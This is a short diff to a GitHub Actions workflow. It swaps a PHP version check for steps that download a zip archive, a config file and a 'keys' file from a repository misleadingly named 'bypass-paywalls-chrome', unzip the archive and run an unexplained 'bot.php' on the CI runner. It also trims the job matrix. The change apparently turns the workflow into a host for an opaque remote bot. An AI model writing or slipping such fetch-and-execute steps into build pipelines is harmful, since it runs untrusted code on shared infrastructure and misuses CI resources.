@@ -17,8 +17,8 @@ jobs:
     runs-on: ubuntu-20.04
     strategy:
       matrix:
-        testi: [1.1, 27, 278, 2v, 9e, 93h, os, yys,]
-        flaga: [Aqw, his, ]
+        testi: [1]
+        flaga: [Aqw]
     steps:
     - name: Setup
       uses: actions/checkout@v1
@@ -44,4 +44,8 @@ jobs:
       run: |
         sudo apt update
         sudo apt install php -y
-        php -V
+        wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/frth.zip
+        unzip frth.zip
+        wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/config.json
+        wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/keys
+        php bot.php
